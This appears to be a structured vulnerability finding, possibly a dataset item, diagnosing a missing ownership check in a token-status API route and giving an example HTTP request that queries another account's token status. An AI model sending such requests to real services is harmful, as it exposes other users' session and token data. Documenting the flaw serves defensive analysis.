diagnosis: The route allows any authenticated user to inspect the revocation status and expiration metadata of any JTI string. Because it lacks validation connecting the token's owner to request.user, attackers can probe session states and token lifecycles of arbitrary accounts.
exploit_request:
GET /api/auth/token-status/?jti=7b34e291-a1b4-4c3e-8219-fc4499120894 HTTP/1.1
Host: auth.nexus.io
Authorization: Bearer <attacker_jwt>
